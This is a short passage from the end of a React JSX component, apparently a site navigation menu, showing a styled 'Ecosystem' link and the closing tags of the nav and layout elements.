                                                        <a className="tracking-wide text-white text-lg focus:text-red pl-2 transition-colors duration-200 hover:text-green-400 cursor-pointer">Ecosystem</a>
                                                    </Link>
                                                </li>
                                            </ul>
                                        </nav>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            </div>
        </>
    )
}